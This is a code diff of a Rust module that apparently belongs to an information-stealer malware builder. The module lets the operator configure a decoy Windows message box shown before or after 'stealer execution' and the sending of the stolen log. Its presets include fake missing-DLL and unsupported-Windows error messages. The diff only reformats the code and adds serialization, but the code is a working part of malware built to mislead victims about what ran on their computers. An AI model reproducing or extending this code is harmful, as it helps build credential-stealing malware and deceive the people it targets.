@@ -23,28 +23,32 @@
  * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  * SOFTWARE.
  */
+use crate::{Ask, AskInstanceFactory, ToExpr};
+use inquire::{Confirm, InquireError, Select, Text, required};
+use proc_macro2::{Literal, TokenStream};
+use quote::quote;
+use serde::{Deserialize, Serialize};
 use std::ffi::CString;
 use std::fmt::{Display, Formatter};
 use std::sync::Arc;
-use inquire::{required, Confirm, InquireError, Select, Text};
-use proc_macro2::{Literal, TokenStream};
-use quote::quote;
 use strum::IntoEnumIterator;
 use strum_macros::{Display, EnumIter};
-use windows::Win32::UI::WindowsAndMessaging::{MB_ABORTRETRYIGNORE, MB_CANCELTRYCONTINUE, MB_ICONERROR, MB_ICONINFORMATION, MB_ICONQUESTION, MB_ICONWARNING, MB_OK, MB_OKCANCEL, MB_RETRYCANCEL, MB_YESNO, MB_YESNOCANCEL};
-use crate::{Ask, AskInstanceFactory, ToExpr};
+use windows::Win32::UI::WindowsAndMessaging::{
+    MB_ABORTRETRYIGNORE, MB_CANCELTRYCONTINUE, MB_ICONERROR, MB_ICONINFORMATION, MB_ICONQUESTION,
+    MB_ICONWARNING, MB_OK, MB_OKCANCEL, MB_RETRYCANCEL, MB_YESNO, MB_YESNOCANCEL,
+};
 
-#[derive(Copy, PartialEq, Clone, EnumIter)]
+#[derive(Copy, PartialEq, Clone, EnumIter, Serialize, Deserialize)]
 pub enum Show {
     Before,
-    After
+    After,
 }
 
 impl Display for Show {
     fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
         match self {
             Show::Before => write!(f, "Before stealer execution"),
-            Show::After => write!(f, "After stealer execution (after the log is sent)")
+            Show::After => write!(f, "After stealer execution (after the log is sent)"),
         }
     }
 }
@@ -52,7 +56,7 @@ impl Display for Show {
 impl Ask for Show {
     fn ask() -> Result<Self, InquireError>
     where
-        Self: Sized
+        Self: Sized,
     {
         Select::new(
             "When should the message box appear?",
@@ -63,18 +67,18 @@ impl Ask for Show {
 }
 
 #[repr(u32)]
-#[derive(Display, Copy, Clone, EnumIter)]
+#[derive(Display, Copy, Clone, EnumIter, Serialize, Deserialize)]
 enum SourceIcon {
     Error = MB_ICONERROR.0,
     Warning = MB_ICONWARNING.0,
     Information = MB_ICONINFORMATION.0,
-    Question = MB_ICONQUESTION.0
+    Question = MB_ICONQUESTION.0,
 }
 
 impl Ask for SourceIcon {
     fn ask() -> Result<Self, InquireError>
     where
-        Self: Sized
+        Self: Sized,
     {
         Select::new(
             "Which icon should the message box display?",
@@ -85,7 +89,7 @@ impl Ask for SourceIcon {
 }
 
 #[repr(u32)]
-#[derive(Copy, Clone, EnumIter)]
+#[derive(Copy, Clone, EnumIter, Serialize, Deserialize)]
 enum SourceButton {
     Ok = MB_OK.0,
     OkCancel = MB_OKCANCEL.0,
@@ -93,13 +97,13 @@ enum SourceButton {
     YesNoCancel = MB_YESNOCANCEL.0,
     RetryCancel = MB_RETRYCANCEL.0,
     AbortRetryIgnore = MB_ABORTRETRYIGNORE.0,
-    CancelTryContinue = MB_CANCELTRYCONTINUE.0
+    CancelTryContinue = MB_CANCELTRYCONTINUE.0,
 }
 
 impl Ask for SourceButton {
     fn ask() -> Result<Self, InquireError>
     where
-        Self: Sized
+        Self: Sized,
     {
         Select::new(
             "Which button layout should the message box use?",
@@ -118,22 +122,23 @@ impl Display for SourceButton {
             SourceButton::YesNoCancel => write!(f, "[Yes] [No] [Cancel]"),
             SourceButton::RetryCancel => write!(f, "[Retry] [Cancel]"),
             SourceButton::AbortRetryIgnore => write!(f, "[Abort] [Retry] [Ignore]"),
-            SourceButton::CancelTryContinue => write!(f, "[Cancel] [Try Again] [Continue]")
+            SourceButton::CancelTryContinue => write!(f, "[Cancel] [Try Again] [Continue]"),
         }
     }
 }
 
+#[derive(Serialize, Deserialize)]
 pub struct CustomSource {
     caption: String,
     text: String,
     icon: SourceIcon,
-    button: SourceButton
+    button: SourceButton,
 }
 
 impl Ask for CustomSource {
     fn ask() -> Result<Self, InquireError>
     where
-        Self: Sized
+        Self: Sized,
     {
         let caption = Text::new("What should the message box caption be?")
             .with_validator(required!())
@@ -150,7 +155,7 @@ impl Ask for CustomSource {
             caption,
             text,
             icon,
-            button
+            button,
         })
     }
 }
@@ -175,19 +180,28 @@ impl ToExpr for CustomSource {
     }
 }
 
-#[derive(EnumIter)]
+#[derive(EnumIter, Serialize, Deserialize)]
 pub enum SourcePresets {
     NotSupported,
     VCRuntimeNotFound,
-    Haram
+    Haram,
 }
 
 impl Display for SourcePresets {
     fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
         match self {
-            SourcePresets::NotSupported => write!(f, "\"This program does not support the version of Windows your computer is running.\""),
-            SourcePresets::VCRuntimeNotFound => write!(f, "\"The code execution cannot proceed because VCRUNTIME140_1.dll was not found. ...\""),
-            SourcePresets::Haram => write!(f, "\"В вашем компьютере найден харам, Срочно нажмите ОК для превращение его в халяль.\"")
+            SourcePresets::NotSupported => write!(
+                f,
+                "\"This program does not support the version of Windows your computer is running.\""
+            ),
+            SourcePresets::VCRuntimeNotFound => write!(
+                f,
+                "\"The code execution cannot proceed because VCRUNTIME140_1.dll was not found. ...\""
+            ),
+            SourcePresets::Haram => write!(
+                f,
+                "\"В вашем компьютере найден харам, Срочно нажмите ОК для превращение его в халяль.\""
+            ),
         }
     }
 }
@@ -227,7 +241,7 @@ impl ToExpr for SourcePresets {
                         #ok | #error
                     );
                 }
-            }
+            },
         }
     }
 }
@@ -235,7 +249,7 @@ impl ToExpr for SourcePresets {
 impl Ask for SourcePresets {
     fn ask() -> Result<Self, InquireError>
     where
-        Self: Sized
+        Self: Sized,
     {
         Select::new(
             "What preset should be used?",
@@ -245,9 +259,10 @@ impl Ask for SourcePresets {
     }
 }
 
+#[derive(Serialize, Deserialize)]
 pub enum MessageBoxSource {
     Preset(SourcePresets),
-    Custom(CustomSource)
+    Custom(CustomSource),
 }
 
 struct CustomSourceFactory;
@@ -284,7 +299,7 @@ impl AskInstanceFactory for PresetFactory {
 impl Ask for MessageBoxSource {
     fn ask() -> Result<Self, InquireError>
     where
-        Self: Sized
+        Self: Sized,
     {
         let factories: Vec<Arc<dyn AskInstanceFactory<Output = Self>>> =
             vec![Arc::new(PresetFactory), Arc::new(CustomSourceFactory)];
@@ -299,14 +314,15 @@ impl ToExpr for MessageBoxSource {
     fn to_expr(&self, _args: ()) -> TokenStream {
         match self {
             MessageBoxSource::Preset(presets) => presets.to_expr(()),
-            MessageBoxSource::Custom(source) => source.to_expr(())
+            MessageBoxSource::Custom(source) => source.to_expr(()),
         }
     }
 }
 
+#[derive(Serialize, Deserialize)]
 pub struct MessageBox {
     pub show: Show,
-    pub message: MessageBoxSource
+    pub message: MessageBoxSource,
 }
 
 impl ToExpr for MessageBox {
@@ -342,7 +358,7 @@ impl ToExpr for MessageBox {
 impl Ask for MessageBox {
     fn ask() -> Result<Self, InquireError>
     where
-        Self: Sized
+        Self: Sized,
     {
         Ok(Self {
             show: Show::ask()?,
@@ -354,7 +370,7 @@ impl Ask for MessageBox {
 impl Ask for Option<MessageBox> {
     fn ask() -> Result<Self, InquireError>
     where
-        Self: Sized
+        Self: Sized,
     {
         let r#use = Confirm::new("Do you want to show message box?")
             .with_default(false)
